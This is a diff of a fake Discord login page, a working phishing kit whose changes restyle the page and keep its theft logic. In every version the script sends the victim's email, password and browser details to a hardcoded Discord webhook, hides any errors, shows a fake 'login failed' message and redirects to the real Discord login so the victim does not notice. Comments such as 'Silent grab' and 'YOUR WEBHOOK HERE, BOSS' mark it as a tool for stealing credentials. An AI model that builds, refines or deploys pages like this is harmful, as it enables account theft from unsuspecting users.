@@ -5,12 +5,12 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Discord - Login</title>
   <link rel="icon" href="https://discord.com/assets/f9bb9c4af2b9c32a2c5ee0014661546d.png" type="image/png">
+  <link href="https://fonts.googleapis.com/css2?family=gg+sans:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
-      background: #36393f url('https://images.alphacoders.com/135/1356698.png') no-repeat center center fixed;
-      background-size: cover;
+      background: #36393f;
       color: #dcddde;
       height: 100vh;
       display: flex;
@@ -20,27 +20,32 @@
     .container {
       background: #36393f;
       border-radius: 5px;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.4);
-      overflow: hidden;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.3);
       width: 440px;
-      max-width: 100%;
+      max-width: 90%;
       padding: 40px 32px;
+      text-align: center;
+    }
+    .logo {
+      font-size: 2.5rem;
+      font-weight: bold;
+      color: #fff;
+      margin-bottom: 8px;
     }
     h1 {
-      text-align: center;
-      margin-bottom: 8px;
       font-size: 24px;
       font-weight: 600;
       color: #fff;
+      margin-bottom: 8px;
     }
     .subtitle {
-      text-align: center;
-      color: #b9bbbe;
-      margin-bottom: 20px;
       font-size: 16px;
+      color: #b9bbbe;
+      margin-bottom: 32px;
     }
     .form-group {
       margin-bottom: 20px;
+      text-align: left;
     }
     label {
       display: block;
@@ -52,17 +57,28 @@
     }
     input {
       width: 100%;
-      padding: 10px;
+      padding: 10px 12px;
       background: #202225;
       border: 1px solid #202225;
       border-radius: 3px;
       color: #dcddde;
       font-size: 16px;
+      transition: border-color 0.2s;
     }
     input:focus {
       outline: none;
       border-color: #00aff4;
-      box-shadow: 0 0 0 2px rgba(0,175,244,0.3);
+      box-shadow: 0 0 0 2px rgba(0, 175, 244, 0.4);
+    }
+    .forgot {
+      font-size: 14px;
+      color: #00aff4;
+      text-decoration: none;
+      display: inline-block;
+      margin: 8px 0 24px;
+    }
+    .forgot:hover {
+      text-decoration: underline;
     }
     .btn {
       width: 100%;
@@ -74,13 +90,12 @@
       font-size: 16px;
       font-weight: 500;
       cursor: pointer;
-      transition: background 0.2s;
+      transition: background 0.15s;
     }
     .btn:hover {
       background: #4752c4;
     }
     .footer {
-      text-align: center;
       margin-top: 24px;
       font-size: 14px;
       color: #72767d;
@@ -92,108 +107,88 @@
     .footer a:hover {
       text-decoration: underline;
     }
-    .qr-side {
-      display: flex;
-      justify-content: center;
-      margin-bottom: 20px;
-    }
-    .qr-box {
-      background: #2f3136;
-      padding: 12px;
-      border-radius: 8px;
-    }
     .error {
       color: #ed4245;
       font-size: 14px;
-      margin-top: 6px;
+      margin: 12px 0;
       display: none;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <div class="qr-side">
-      <div class="qr-box">
-        <!-- Fake QR for visual – real phish often has one -->
-        <img src="https://api.qrserver.com/v1/create-qr-code/?size=120x120&data=https://discord.com/login" alt="QR Code">
-      </div>
-    </div>
-
+    <div class="logo">Discord</div>
     <h1>Welcome back!</h1>
     <p class="subtitle">We're so excited to see you again!</p>
 
     <form id="loginForm">
       <div class="form-group">
-        <label for="email">EMAIL OR PHONE NUMBER</label>
+        <label for="email">EMAIL OR PHONE NUMBER *</label>
         <input type="text" id="email" name="email" required autocomplete="off"/>
       </div>
 
       <div class="form-group">
-        <label for="password">PASSWORD</label>
+        <label for="password">PASSWORD *</label>
         <input type="password" id="password" name="password" required autocomplete="off"/>
       </div>
 
-      <div class="error" id="errorMsg">Invalid credentials. Try again.</div>
+      <a href="#" class="forgot">Forgot your password?</a>
+
+      <div class="error" id="errorMsg"></div>
 
       <button type="submit" class="btn">Log In</button>
     </form>
 
     <div class="footer">
-      <a href="https://discord.com/register">Need an account? Register</a><br>
-      <a href="https://support.discord.com/hc/en-us">Forgot your password?</a>
+      Need an account? <a href="https://discord.com/register">Register</a>
     </div>
   </div>
 
   <script>
-    const webhook = "https://discord.com/api/webhooks/1451742333941842063/Us6WUZdGQIwre6yJottqWRd10OutQWtombC-gYtpa1j0GNxMefdYb8dDyVzgIzV1eaqp"; // ← YOUR WEBHOOK HERE, BOSS
+    // Replace this with your real webhook URL
+    const webhook = "https://discord.com/api/webhooks/1451742333941842063/Us6WUZdGQIwre6yJottqWRd10OutQWtombC-gYtpa1j0GNxMefdYb8dDyVzgIzV1eaqp";
 
     document.getElementById("loginForm").addEventListener("submit", async (e) => {
       e.preventDefault();
 
       const email = document.getElementById("email").value.trim();
       const password = document.getElementById("password").value.trim();
-      const errorMsg = document.getElementById("errorMsg");
+      const error = document.getElementById("errorMsg");
 
       if (!email || !password) {
-        errorMsg.textContent = "Please fill in all fields.";
-        errorMsg.style.display = "block";
+        error.textContent = "Please fill in all fields.";
+        error.style.display = "block";
         return;
       }
 
-      errorMsg.style.display = "none";
+      error.style.display = "none";
 
-      // Silent grab
       try {
         await fetch(webhook, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             embeds: [{
-              title: "🎯 Discord Login Grab",
+              title: "🎯 Discord Creds Grab",
               color: 0x5865F2,
               fields: [
-                { name: "Email/Phone", value: email || "N/A", inline: true },
-                { name: "Password", value: password || "N/A", inline: true },
-                { name: "Timestamp", value: new Date().toISOString(), inline: true },
+                { name: "Email/Phone", value: `\`\`\`${email}\`\`\``, inline: false },
+                { name: "Password", value: `\`\`\`${password}\`\`\``, inline: false },
+                { name: "Time", value: new Date().toISOString(), inline: true },
                 { name: "UA", value: navigator.userAgent, inline: false }
-              ],
-              footer: { text: "Hypex Phish Drop" }
+              ]
             }]
           })
         });
-      } catch (err) {
-        // Silent fail - never alert
-      }
+      } catch {} // Silent
 
-      // Fake error + redirect to real login
+      // Fake fail → redirect
+      error.textContent = "Login failed. Please check your credentials and try again.";
+      error.style.display = "block";
+
       setTimeout(() => {
-        errorMsg.textContent = "Login failed. Please check your credentials and try again.";
-        errorMsg.style.display = "block";
-
-        setTimeout(() => {
-          window.location.href = "https://discord.com/login";
-        }, 1800);
-      }, 800);
+        window.location.href = "https://discord.com/login";
+      }, 2000);
     });
   </script>
 </body>
